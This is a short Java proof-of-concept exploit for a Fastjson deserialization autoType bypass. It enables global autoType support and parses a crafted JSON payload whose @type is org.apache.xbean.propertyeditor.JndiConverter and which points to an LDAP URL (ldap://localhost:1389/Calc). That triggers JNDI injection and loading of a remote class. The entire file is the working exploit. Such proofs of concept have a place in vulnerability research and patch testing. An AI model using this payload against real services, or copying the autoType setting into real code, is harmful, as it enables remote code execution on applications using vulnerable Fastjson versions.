import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonBypass1262 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                "\"AsText\":\"ldap://localhost:1389/Calc\"}";
        JSON.parse(poc);
    }
}
